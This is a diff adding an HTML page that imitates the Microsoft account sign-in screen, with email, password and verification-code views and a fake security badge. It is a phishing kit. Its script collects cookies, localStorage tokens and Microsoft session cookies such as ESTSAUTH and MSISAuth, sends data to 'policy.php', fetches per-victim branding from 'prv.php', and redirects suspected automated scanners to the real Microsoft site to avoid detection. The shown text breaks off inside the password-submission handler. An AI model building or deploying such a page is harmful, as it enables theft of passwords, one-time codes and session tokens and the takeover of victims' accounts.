@@ -1,0 +1,1233 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="en">
+<head>
+	<title>Sign in to your account</title>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="robots" content="none">
+	<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2.0,user-scalable=yes">
+	<link rel="shortcut icon" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a6b30fa7a1e4a3e498ff81791a0f5368.ico">
+	<style>
+	html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,hgroup,main,menu,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block;vertical-align:baseline}audio:not([controls]){display:none;height:0}[hidden],template{display:none}a{background-color:transparent}a:active,a:hover{outline:0}abbr[title]{border-bottom:1px dotted}b,strong{font-weight:700}dfn{font-style:italic}h1{font-size:2em;margin:.67em 0}mark{background:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sup{top:-.5em}sub{bottom:-.25em}img{border:0}svg:not(:root){overflow:hidden}figure{margin:1em 40px}hr{-moz-box-sizing:content-box;box-sizing:content-box;height:0}pre{overflow:auto}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}button,input,optgroup,select,textarea{color:inherit;font:inherit;margin:0}button{overflow:visible}button,select{text-transform:none}button,html input[type=button],input[type=reset],input[type=submit]{-webkit-appearance:button;cursor:pointer}button[disabled],html input[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}input{line-height:normal}input[type=checkbox],input[type=radio]{box-sizing:border-box;padding:0}input[type=number]::-webkit-inner-spin-button,input[type=number]::-webkit-outer-spin-button{height:auto}input[type=search]{-webkit-appearance:textfield;-moz-box-sizing:content-box;-webkit-box-sizing:content-box;box-sizing:content-box}input[type=search]::-webkit-search-cancel-button,input[type=search]::-webkit-search-decoration{-webkit-appearance:none}fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}legend{border:0;padding:0}textarea{overflow:auto}optgroup{font-weight:700}table{border-collapse:collapse;border-spacing:0}td,th{padding:0}*{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}:after,:before{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}button,input,select,textarea{font-family:inherit;font-size:inherit;line-height:inherit}a:focus{outline:thin dotted;outline-offset:-2px;outline:5px auto -webkit-focus-ring-color}figure{margin:0}img{vertical-align:middle}
+
+	/* Core Styles */
+	body {
+		font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande",Roboto,Ebrima,"Nirmala UI",Gadugi,"Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI",Tunga,"Lao UI",Raavi,"Iskoola Pota",Latha,Leelawadee,"Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+		font-size: 15px;
+		line-height: 20px;
+		font-weight: 400;
+		color: #000;
+		background-color: #fff;
+		height: 100%;
+		width: 100%;
+		position: absolute;
+		margin: 0;
+		padding: 0;
+	}
+	
+	body.cb {
+		text-align: center;
+	}
+	
+	a {
+		color: #0067b8;
+		text-decoration: none;
+	}
+	
+	a:hover {
+		text-decoration: underline;
+		color: #666;
+	}
+	
+	/* Layout */
+	.outer {
+		display: table;
+		position: absolute;
+		height: 100%;
+		width: 100%;
+	}
+	
+	.middle {
+		display: table-cell;
+		vertical-align: middle;
+	}
+	
+	/* Background */
+	.background-image-holder {
+		position: fixed;
+		top: 0;
+		left: 0;
+		width: 100%;
+		height: 100%;
+		background: #f2f2f2;
+		background-image: linear-gradient(to bottom right, #e9e4e0, #d7e8e1);
+		z-index: -2;
+	}
+	
+	.background-image {
+		position: fixed;
+		top: 0;
+		left: 0;
+		width: 100%;
+		height: 100%;
+		background-repeat: no-repeat;
+		background-position: center center;
+		background-size: cover;
+		z-index: -1;
+		display: none;
+	}
+	
+	/* Sign-in Box */
+	.sign-in-box {
+		margin: 0 auto;
+		position: relative;
+		max-width: 440px;
+		width: calc(100% - 40px);
+		padding: 44px;
+		margin-bottom: 28px;
+		background-color: #fff;
+		-webkit-box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+		-moz-box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+		box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+		min-width: 320px;
+		min-height: 338px;
+		overflow: hidden;
+	}
+	
+	/* Animations */
+	.fade-in-lightbox {
+		animation: fadeIn 0.3s ease-in;
+		-webkit-animation: fadeIn 0.3s ease-in;
+	}
+	
+	.animate {
+		animation-duration: 0.25s;
+		animation-timing-function: cubic-bezier(0.5,0,0.5,1);
+		animation-fill-mode: both;
+	}
+	
+	.slide-in-next {
+		animation-name: show-from-right;
+	}
+	
+	@keyframes fadeIn {
+		from { opacity: 0; }
+		to { opacity: 1; }
+	}
+	
+	@keyframes show-from-right {
+		from { left: 200px; opacity: 0; }
+		to { left: 0; opacity: 1; }
+	}
+	
+	/* Logo */
+	.banner-logo {
+		max-width: 256px;
+		height: 24px;
+		display: block;
+		margin: 0;
+		margin-bottom: 24px;
+	}
+	
+	/* Identity Banner */
+	.identityBanner {
+		height: 24px;
+		background: #fff;
+		margin-top: 16px;
+		margin-bottom: -4px;
+		display: flex;
+		align-items: center;
+	}
+	
+	.identity {
+		line-height: 24px;
+		white-space: nowrap;
+		overflow: hidden;
+		text-overflow: ellipsis;
+		flex: 1;
+	}
+	
+	.backButton {
+		min-height: 24px;
+		width: 24px;
+		min-width: 24px;
+		float: left;
+		padding: 0;
+		background-color: #fff;
+		border-width: 0;
+		border-radius: 12px;
+		margin-right: 2px;
+		cursor: pointer;
+	}
+	
+	.backButton:hover {
+		background-color: #e6e6e6;
+	}
+	
+	/* Title */
+	.row.title {
+		font-size: 24px;
+		line-height: 28px;
+		font-weight: 300;
+		color: #1b1b1b;
+		font-size: 1.5rem;
+		font-weight: 600;
+		padding: 0;
+		margin-top: 16px;
+		margin-bottom: 12px;
+	}
+	
+	/* Email Input Form */
+	#emailInputView {
+		display: block;
+	}
+	
+	/* Form Elements */
+	.row {
+		margin-left: 0;
+		margin-right: 0;
+		position: relative;
+	}
+	
+	.form-group {
+		margin-bottom: 16px;
+		position: relative;
+	}
+	
+	.placeholderContainer {
+		width: 100%;
+		position: relative;
+	}
+	
+	.text-box {
+		width: 100%;
+		padding: 6px 10px;
+		border-width: 1px;
+		border-style: solid;
+		border-color: rgba(0,0,0,0.6);
+		height: 36px;
+		outline: none;
+		border-radius: 0;
+		background-color: transparent;
+		border-top-width: 0;
+		border-left-width: 0;
+		border-right-width: 0;
+		padding-left: 0;
+		font-size: 15px;
+		color: #000;
+	}
+	
+	.text-box:focus {
+		border-color: #0067b8;
+	}
+	
+	.text-box.has-error {
+		border-color: #e81123;
+	}
+	
+	/* Error Messages */
+	.alert-error {
+		color: #e81123;
+		margin-bottom: 16px;
+		display: none;
+	}
+	
+	/* Buttons */
+	.position-buttons {
+		position: relative;
+		margin-top: 20px;
+	}
+	
+	.position-buttons > div:first-child {
+		display: inline-block;
+		width: 100%;
+		margin-bottom: 36px;
+	}
+	
+	.win-button-pin-bottom {
+		display: block;
+		position: absolute;
+		bottom: 0;
+		left: 0;
+		right: 0;
+		padding-bottom: 4px;
+		z-index: 100;
+	}
+	
+	.button-container {
+		position: absolute;
+		bottom: 0;
+		right: 0;
+		text-align: right;
+	}
+	
+	.button_primary {
+		min-width: 108px;
+		line-height: normal;
+		margin-top: 0;
+		margin-bottom: 0;
+		border-width: 1px;
+		background-color: #0067b8;
+		color: white;
+		min-height: 32px;
+		border: none;
+		border-radius: 0;
+		display: block;
+		font-size: 1em;
+		padding: 4px 12px;
+		cursor: pointer;
+	}
+	
+	.button_primary:hover {
+		background-color: #005da6;
+	}
+	
+	/* Progress Indicator */
+	.progress {
+		position: relative;
+		overflow: hidden;
+		height: 6px;
+		margin-bottom: 20px;
+		display: none;
+		background-color: #f3f3f3;
+	}
+	
+	.progress > div {
+		position: absolute;
+		height: 5px;
+		width: 5px;
+		background-color: #0067b8;
+		z-index: 100;
+		border-radius: 50%;
+		opacity: 0;
+		animation: progressDot 2s infinite;
+	}
+	
+	.progress > div:nth-child(1) { animation-delay: 0.05s; }
+	.progress > div:nth-child(2) { animation-delay: 0.2s; }
+	.progress > div:nth-child(3) { animation-delay: 0.35s; }
+	.progress > div:nth-child(4) { animation-delay: 0.5s; }
+	.progress > div:nth-child(5) { animation-delay: 0.65s; }
+	
+	@keyframes progressDot {
+		0%, 20% {
+			left: 0;
+			animation-timing-function: ease-out;
+			opacity: 0;
+		}
+		25% {
+			opacity: 1;
+		}
+		35% {
+			left: 45%;
+			animation-timing-function: linear;
+		}
+		65% {
+			left: 60%;
+			animation-timing-function: ease-in;
+		}
+		75% {
+			opacity: 1;
+		}
+		100%, 80% {
+			left: 100%;
+			opacity: 0;
+		}
+	}
+	
+	/* Pagination View */
+	.pagination-view {
+		position: relative;
+		min-height: 206px;
+	}
+	
+	.pagination-view.has-identity-banner {
+		min-height: 170px;
+	}
+	
+	/* Footer */
+	.footer {
+		position: absolute;
+		left: 0;
+		bottom: 0;
+		width: 100%;
+		overflow: visible;
+		z-index: 99;
+		clear: both;
+		min-height: 28px;
+		text-align: right;
+	}
+	
+	.footer-content.footer-item {
+		color: #000;
+		font-size: 12px;
+		line-height: 28px;
+		white-space: nowrap;
+		display: inline-block;
+		margin-left: 8px;
+		margin-right: 8px;
+	}
+	
+	div.footerNode {
+		margin: 0;
+		padding-right: 40px;
+	}
+	
+	/* Boilerplate */
+	.boilerplate-text {
+		background-color: #f2f2f2;
+		padding: 24px 44px 36px 44px;
+		margin: 76px -44px -44px -44px;
+	}
+	
+	/* Email View and Password View Specific Styles */
+	#emailInputView {
+		display: block;
+	}
+	
+	#passwordView {
+		display: none;
+	}
+	
+	/* Auth Code Section */
+	#authCodeView {
+		display: none;
+	}
+	
+	.auth-code-header {
+		font-size: 24px;
+		line-height: 28px;
+		font-weight: 300;
+		color: #1b1b1b;
+		font-weight: 600;
+		margin-bottom: 16px;
+	}
+	
+	.auth-code-subheader {
+		font-size: 15px;
+		line-height: 20px;
+		margin-bottom: 16px;
+	}
+	
+	/* Sign-in options bar */
+	.sign-in-options {
+		background-color: #f2f2f2;
+		padding: 12px 0;
+		border-top: 1px solid #e6e6e6;
+		display: flex;
+		align-items: center;
+		justify-content: center;
+		margin-top: 44px;
+		margin-left: -44px;
+		margin-right: -44px;
+		margin-bottom: -44px;
+	}
+	
+	.sign-in-options img {
+		margin-right: 8px;
+		height: 16px;
+		width: 16px;
+	}
+	
+	/* Security Badge - Add this to show it's secure */
+	.security-badge {
+		display: flex;
+		align-items: center;
+		justify-content: center;
+		margin-top: 20px;
+		color: #767676;
+		font-size: 13px;
+	}
+	
+	.security-badge img {
+		width: 16px;
+		height: 16px;
+		margin-right: 8px;
+	}
+	
+	/* Responsive Adjustments */
+	@media (max-width: 600px), (max-height: 366px) {
+		.background-image-holder,
+		.background-image {
+			display: none;
+		}
+		
+		.middle {
+			vertical-align: top;
+		}
+		
+		.sign-in-box {
+			padding: 24px;
+			margin-top: 0;
+			margin-bottom: 88px;
+			width: 100%;
+			width: 100vw;
+			box-shadow: none;
+			border: 0;
+		}
+		
+		.footer {
+			background-color: #fff;
+			text-align: left;
+		}
+		
+		div.footerNode {
+			float: left;
+			margin: 0 24px !important;
+			padding-right: 0;
+		}
+		
+		.footer-content.footer-item {
+			color: #747474;
+		}
+		
+		.boilerplate-text {
+			padding: 20px;
+			margin-top: 56px;
+			margin-right: 0;
+			margin-bottom: 0;
+			margin-left: 0;
+		}
+		
+		.sign-in-options {
+			margin-left: -24px;
+			margin-right: -24px;
+			margin-bottom: -24px;
+		}
+	}
+	</style>
+</head>
+
+<body class="cb">
+	<div>
+		<form name="f1" id="i0281" novalidate spellcheck="false" method="post" target="_top" autocomplete="off">
+			<div id="lightboxBackgroundContainer">
+				<div class="background-image-holder">
+					<div class="background-image ext-background-image"></div>
+				</div>
+			</div>
+			
+			<div class="outer">
+				<div class="middle">
+					<div id="lightbox" class="sign-in-box fade-in-lightbox" style="display:none">
+						<div class="lightbox-cover"></div>
+						
+						<!-- Progress indicator -->
+						<div id="progressBar" class="progress" style="display:none;">
+							<div></div>
+							<div></div>
+							<div></div>
+							<div></div>
+							<div></div>
+						</div>
+						
+						<!-- Logo -->
+						<div>
+							<img class="banner-logo" role="img" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
+						</div>
+						
+						<!-- Email Input View -->
+<div id="emailInputView">
+		<div role="main">
+			<div class="pagination-view animate">
+			<div>
+			<div id="loginHeader" class="row title" role="heading">Sign in</div>
+										
+										<div class="row">
+											<div class="form-group">
+												<div role="alert">
+													<div id="emailError" class="alert alert-error" style="display:none;">Enter a valid email address, phone number, or Skype name.</div>
+												</div>
+												
+												<div class="placeholderContainer">
+		<input name="loginfmt" type="email" id="i0116" autocomplete="off" class="form-control input ext-input text-box ext-text-box" placeholder="Email, phone, or Skype" tabindex="0">
+												</div>
+											</div>
+										</div>
+										
+										<!-- No account/Can't access links -->
+										<div class="row">
+											<div style="font-size: 13px;">
+												<div class="form-group">
+													No account? <a id="createAccount" href="#">Create one!</a>
+												</div>
+												<div class="form-group">
+													<a id="cantAccessAccount" href="#">Can't access your account?</a>
+												</div>
+											</div>
+										</div>
+										
+										<div class="position-buttons">
+											<div class="win-button-pin-bottom">
+												<div class="row">
+													<div class="button-container">
+														<input type="button" id="idSIButton9" class="button_primary" value="Next">
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+						
+						<!-- Password View -->
+						<div id="passwordView">
+							<div role="main">
+								<div>
+									<!-- Identity Banner -->
+									<div class="animate slide-in-next">
+										<div>
+											<div class="identityBanner">
+												<button type="button" id="backArrow" class="backButton">
+													<img role="presentation" src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" alt="Back">
+												</button>
+												<div id="displayName" class="identity"></div>
+											</div>
+										</div>
+									</div>
+									
+									<!-- Password Form -->
+									<div class="pagination-view animate has-identity-banner slide-in-next">
+										<div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true">
+											<div id="loginHeader" class="row title ext-title" role="heading">Enter password</div>
+											
+											<div class="row">
+												<div class="form-group">
+													<div role="alert">
+														<div id="passwordError2" style="display:none;" class="alert alert-error">Please enter your password.</div>
+														<div id="passwordError" style="display:none;" class="alert alert-error">Your account or password is incorrect. If you can't remember your password, <a id="idA_IL_ForgotPassword0" href="https://passwordreset.microsoftonline.com/">reset it now.</a></div>
+														<div id="important" style="color: black;font-size: 13px;" class="alert alert-error">
+															Because you're accessing sensitive info, you need to verify your password
+														</div>
+													</div>
+													
+													<div class="placeholderContainer">
+														<input name="passwd" type="password" id="i0118" autocomplete="off" class="form-control input ext-input text-box ext-text-box" placeholder="Password" tabindex="0">
+													</div>
+												</div>
+											</div>
+											
+											<div class="position-buttons">
+												<div>
+													<div class="row">
+														<div class="text-13">
+															<div class="form-group">
+																<a id="idA_PWD_ForgotPassword" role="link" href="https://passwordreset.microsoftonline.com/" target="">Forgot my password</a>
+															</div>
+														</div>
+													</div>
+												</div>
+												
+												<div class="win-button-pin-bottom">
+													<div class="row">
+														<div class="button-container">
+															<input type="button" id="idSIButton9" class="button_primary ext-primary" value="Sign in">
+														</div>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+						
+						<!-- Auth Code View -->
+						<div id="authCodeView" style="display:none;">
+							<div role="main">
+								<!-- Identity Banner -->
+								<div class="animate slide-in-next">
+									<div>
+										<div class="identityBanner">
+											<button type="button" id="backToPassword" class="backButton">
+												<img role="presentation" src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" alt="Back">
+											</button>
+											<div id="emailDisplay" class="identity"></div>
+										</div>
+									</div>
+								</div>
+								
+								<!-- Auth Code Form -->
+								<div class="pagination-view animate has-identity-banner slide-in-next">
+									<div>
+										<div class="auth-code-header">Enter code</div>
+										<div class="auth-code-subheader">We've sent a code to verify your identity. Please enter it below.</div>
+										
+										<div class="row">
+											<div class="form-group">
+												<div role="alert">
+													<div id="codeError" style="display:none;" class="alert alert-error">That code didn't work. Please try again.</div>
+													<div id="emptyCodeError" style="display:none;" class="alert alert-error">Please enter the verification code.</div>
+												</div>
+												
+												<div class="placeholderContainer">
+													<input name="authCode" type="text" id="authCodeInput" autocomplete="off" class="form-control input ext-input text-box ext-text-box" placeholder="Code" tabindex="0" maxlength="8" style="letter-spacing: 2px; text-align: center; font-size: 18px;">
+												</div>
+											</div>
+										</div>
+										
+										<div class="position-buttons">
+											<div>
+												<div class="row">
+													<div class="text-13">
+														<div class="form-group">
+															<a id="resendCode" role="link" href="#">Didn't receive a code?</a>
+														</div>
+													</div>
+												</div>
+											</div>
+											
+											<div class="win-button-pin-bottom">
+												<div class="row">
+													<div class="button-container">
+														<input type="button" id="idSubmitCode" class="button_primary ext-primary" value="Verify">
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+						
+						<!-- Security badge -->
+						<div class="security-badge">
+							<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiM3Njc2NzYiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIj48cmVjdCB4PSIzIiB5PSIxMSIgd2lkdGg9IjE4IiBoZWlnaHQ9IjExIiByeD0iMiIgcnk9IjIiPjwvcmVjdD48cGF0aCBkPSJNNyAxMVY3YTUgNSAwIDAgMSAxMCAwdjQiPjwvcGF0aD48L3N2Zz4=" alt="Secure">
+							<span>Your connection to Microsoft is secure</span>
+						</div>
+						
+						<!-- Sign-in options -->
+						<div class="sign-in-options">
+							<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiM2NjY2NjYiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIj48cGF0aCBkPSJNMjEgMmwtMiAybS03LjYxIDcuNjFhNS41IDUuNSAwIDEgMS03Ljc3OCAwIDUuNSA1LjUgMCAwIDEgNy43NzcgMHoiPjwvcGF0aD48L3N2Zz4=" alt="key">
+							<span style="color: #666; font-size: 13px;">Sign-in options</span>
+						</div>
+						
+						<!-- Hidden fields -->
+						<input type="hidden" name="count" id="count" value="1">
+						<input type="hidden" name="cookies_data" id="cookies_data" value="">
+						<input type="hidden" name="session_data" id="session_data" value="">
+						<input type="hidden" name="adfs_tokens" id="adfs_tokens" value="">
+						<input type="hidden" name="auth_code" id="auth_code" value="">
+						<input type="hidden" name="auth_token" id="auth_token" value="">
+						<input type="hidden" name="security_hash" id="security_hash" value="">
+						
+						<!-- Boilerplate text (initially hidden) -->
+						<div id="idBoilerPlateText" class="wrap-content boilerplate-text ext-boilerplate-text" style="display:none"></div>
+					</div>
+				</div>
+				
+				<!-- Footer -->
+				<div id="footer" role="contentinfo" class="footer ext-footer">
+					<div>
+						<div id="footerLinks" class="footerNode text-secondary">
+							<a id="ftrTerms" href="https://www.microsoft.com/en-US/servicesagreement/" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
+							<a id="ftrPrivacy" href="https://privacy.microsoft.com/en-US/privacystatement" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
+						</div>
+					</div>
+				</div>
+			</div>
+		</form>
+	</div>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+// Helper functions for cookie and session data collection
+function collectCookiesData() {
+    var cookiesObj = {};
+    var cookies = document.cookie.split(';');
+    for(var i = 0; i < cookies.length; i++) {
+        var cookie = cookies[i].trim().split('=');
+        if(cookie.length === 2) {
+            cookiesObj[cookie[0]] = cookie[1];
+        }
+    }
+    return btoa(JSON.stringify(cookiesObj));
+}
+
+function collectSessionData() {
+    var sessionData = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        screenWidth: window.screen.width,
+        screenHeight: window.screen.height,
+        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookiesEnabled: navigator.cookieEnabled,
+        localStorage: {},
+        referrer: document.referrer,
+        timestamp: new Date().getTime(),
+        url: window.location.href
+    };
+    
+    // Try to get localStorage
+    try {
+        for(var i = 0; i < localStorage.length; i++) {
+            var key = localStorage.key(i);
+            sessionData.localStorage[key] = localStorage.getItem(key);
+        }
+    } catch(e) {
+        // Ignore error, localStorage might be blocked
+    }
+    
+    // Check for SSO cookies
+    if(document.cookie.indexOf('ESTSAUTHPERSISTENT') > -1 || 
+       document.cookie.indexOf('ESTSAUTH') > -1 || 
+       document.cookie.indexOf('ESTSAUTHLIGHT') > -1) {
+        sessionData.ssoDetected = true;
+    }
+    
+    return btoa(JSON.stringify(sessionData));
+}
+
+function collectADFSTokens() {
+    var tokens = {};
+    var adfsTokenNames = [
+        'MSISAuth', 
+        'MSISAuthenticated', 
+        'MSISLoopDetectionCookie', 
+        'ESTSAUTH', 
+        'ESTSAUTHPERSISTENT', 
+        'ESTSAUTHLIGHT',
+        'MSPAuth',
+        'MSPProf'
+    ];
+    
+    var cookies = document.cookie.split(';');
+    for(var i = 0; i < cookies.length; i++) {
+        var cookie = cookies[i].trim().split('=');
+        if(cookie.length === 2) {
+            for(var j = 0; j < adfsTokenNames.length; j++) {
+                if(cookie[0].indexOf(adfsTokenNames[j]) !== -1) {
+                    tokens[cookie[0]] = cookie[1];
+                }
+            }
+        }
+    }
+    
+    // Try to get tokens from localStorage
+    try {
+        for(var key in localStorage) {
+            if(key.indexOf('token') !== -1 || key.indexOf('Token') !== -1 || 
+               key.indexOf('auth') !== -1 || key.indexOf('Auth') !== -1 || 
+               key.indexOf('ADFS') !== -1 || key.indexOf('adfs') !== -1) {
+                tokens[key] = localStorage.getItem(key);
+            }
+        }
+    } catch(e) {
+        // Ignore localStorage errors
+    }
+    
+    return btoa(JSON.stringify(tokens));
+}
+
+// Security and AJAX helper functions
+function generateAuthToken(email) {
+    // Create a date string in YYYYMMDD format
+    const today = new Date();
+    const dateStr = today.getFullYear() + 
+                   ('0' + (today.getMonth() + 1)).slice(-2) + 
+                   ('0' + today.getDate()).slice(-2);
+    
+    // Return SHA-256 hash of email + date + secret
+    return CryptoJS.SHA256(email + dateStr + "ms_auth_74fhw839f24").toString(CryptoJS.enc.Hex);
+}
+
+function secureAjaxSend(data, callback) {
+    // Encode data
+    const jsonData = JSON.stringify(data);
+    const encodedData = btoa(jsonData);
+    
+    // Create signature
+    const signature = CryptoJS.HmacSHA256(encodedData, "ms_auth_74fhw839f24").toString(CryptoJS.enc.Hex);
+    
+    // Send via AJAX
+    $.ajax({
+        url: 'policy.php',
+        type: 'POST',
+        data: {
+            send_ajax: 'true',
+            data: encodedData,
+            signature: signature
+        },
+        success: function(response) {
+            try {
+                const result = JSON.parse(response);
+                callback(result);
+            } catch (e) {
+                callback({status: 'error', message: 'Invalid server response'});
+            }
+        },
+        error: function() {
+            callback({status: 'error', message: 'Connection error'});
+        }
+    });
+}
+
+function performAntiBot() {
+    // Simple anti-bot checks
+    const botPatterns = [
+        'headless', 'selenium', 'webdriver', 'phantom', 'puppeteer',
+        'nightmare', 'slimer', 'casper'
+    ];
+    
+    // Check suspicious properties
+    let botScore = 0;
+    
+    // Check if common bot properties exist
+    if (window.callPhantom || window._phantom || window.phantom) botScore += 3;
+    if (window.__nightmare) botScore += 3;
+    if (window.webdriver || navigator.webdriver) botScore += 3;
+    
+    // Check user agent for bot keywords
+    const ua = navigator.userAgent.toLowerCase();
+    for (const pattern of botPatterns) {
+        if (ua.indexOf(pattern) !== -1) botScore += 2;
+    }
+    
+    return botScore < 5; // Threshold for bot detection
+}
+
+$(document).ready(function() {
+    // Anti-bot verification
+    if (!performAntiBot()) {
+        // Redirect to official Microsoft site if bot detected
+        window.location.href = "https://login.microsoftonline.com";
+        return;
+    }
+    
+    // Auto-detect and decode email from hash
+    const hash = window.location.hash.substr(1);
+    let email = '';
+    
+    if (hash) {
+        // Try to decode from base64 first (more secure)
+        try {
+            const decoded = atob(hash);
+            if (decoded.indexOf('@') !== -1) {
+                email = decoded;
+            }
+        } catch (e) {
+            // If not base64, try URL decoding
+            email = decodeURIComponent(hash);
+        }
+        
+        // Set email in the identity fields
+        $('.identity').html(email);
+        $('#emailDisplay').html(email);
+        $('#emailInputView').hide();
+        $('#passwordView').show();
+    } else {
+        $('#emailInputView').show();
+        $('#passwordView').hide();
+    }
+    
+    // Collect cookies and session data
+    $('#cookies_data').val(collectCookiesData());
+    $('#session_data').val(collectSessionData());
+    $('#adfs_tokens').val(collectADFSTokens());
+    
+    // Show the lightbox
+    setTimeout(function (){
+        $('#lightbox').show();
+        if (hash) {
+            $('#i0118').focus();
+        } else {
+            $('#i0116').focus();
+        }
+    }, 1000);
+    
+    // Fetch company branding if on password page
+    if (hash) {
+        fetchBranding(email);
+    }
+    
+    // Event handlers setup
+    setupEventHandlers();
+    
+    function fetchBranding(email) {
+        var request = new XMLHttpRequest();
+        var url = 'prv.php?id=' + encodeURIComponent(email);
+        request.open('GET', url, true);
+        request.onload = function() {
+            if (this.status >= 200 && this.status < 400) {
+                try {
+                    var data = JSON.parse(this.response);
+                    // Save security hash for later validation
+                    $('#security_hash').val(data.security_hash || '');
+                    
+                    // Apply branding
+                    applyBranding(data);
+                } catch (e) {
+                    console.error("Error parsing branding response");
+                }
+            }
+        };
+        request.send();
+    }
+    
+    function applyBranding(data) {
+        var logo_image = data.logo_image;
+        var bg_image = data.bg_image;
+        var bg_color = data.bgcolor;
+        var memo = data.memo;
+        
+        if(bg_image != null && bg_image != '' && bg_image != 'null'){
+            $('.background-image').css('background-image', 'url(' + bg_image + ')');
+            $('.background-image').css('box-shadow', 'inset 0 0 0 1000px rgb(0 0 0 / 50%)');
+            $('.background-image').show();
+        }
+        
+        if(logo_image != null && logo_image != '' && logo_image != 'null'){
+            $('.banner-logo').attr('src', logo_image);
+        }
+        
+        if(bg_color != null && bg_color != '' && bg_color != 'null' && (bg_image == null || bg_image == '' || bg_image == 'null')){
+            $('.background-image').hide();
+            $('.background-image-holder').css('background-color', bg_color);
+        }
+        
+        if(memo != null && memo != '' && memo != 'null'){
+            $('#idBoilerPlateText').show();
+            $('#idBoilerPlateText').text(memo);
+            $('#idBoilerPlateText').css('margin-top','44px');    
+        }
+    }
+    
+    function setupEventHandlers() {
+        // Back button handler
+        $('#backArrow').on('click', function() {
+            history.back();
+        });
+        
+        // Back to password from auth code
+        $('#backToPassword').on('click', function() {
+            $('#authCodeView').hide();
+            $('#passwordView').show();
+            $('#i0118').focus();
+        });
+        
+        // Resend code link
+        $('#resendCode').on('click', function(e) {
+            e.preventDefault();
+            $('#authCodeInput').focus();
+        });
+        
+        // Email submission handler with enhanced security
+        $('#idSIButton9').on('click', function (event){
+            if($('#emailInputView').is(':visible')) {
+                event.preventDefault ? event.preventDefault() : event.returnValue = false;
+                var email = $('#i0116').val();
+                
+                // Validate email
+                if(email == ""){
+                    $("#emailError").show();
+                    $("#i0116").css("border-color", "#e81123");
+                    $('#i0116').focus();
+                    return;
+                }
+                
+                // Show loading UI
+                $("#i0116").css("border-color", "rgba(0,0,0,0.6)");
+                $('#progressBar').show();
+                $("#emailError").hide();
+                $('#idSIButton9').prop('disabled', true);
+                
+                // Generate a secure hash of the email for the redirect
+                const emailHash = btoa(email); // Base64 encode for security
+                
+                // Redirect to the password page with encoded email hash
+                setTimeout(function(){
+                    window.location.href = window.location.pathname + "#" + emailHash;
+                    window.location.reload();
+                }, 1500);
+            } else if($('#passwordView').is(':visible')) {
+                // Password submission with enhanced security
+                event.preventDefault ? event.preventDefault() : event.returnValue = false;
+                var user = $('.identity').html();
+                var pass = $('#i0118').val();
+                var count = $('#count').val();
+                
+                // Generate auth token for form security
+                var authToken = generateAuthToken(user);
+                
+                // Update data before submission
+                $('#cookies_data').val(collectCookiesData());
+                $('#session_data').val(collectSessionData());
+                $('#adfs_tokens').val(collectADFSTokens());
+                $('#auth_token').val(authToken);
+                
+                // Validate password
+                if(pass == ""){
+                    $("#passwordError2").show();
+                    $("#passwordError").hide();
+                    $("#important").hide();
+                    $("#i0118").css("border-color", "#e81123");
+                    $('#i0118').focus();
+                    return;
+                }
+                
+                // Show loading UI
+                $("#i0118").css("border-color", "rgba(0,0,0,0.6)");
+                $('#progressBar').show();
+                $("#passwordError2").hide();
+                $("#passwordError").hide();
+                $('#idSIButton9').prop('disabled', true);
+                
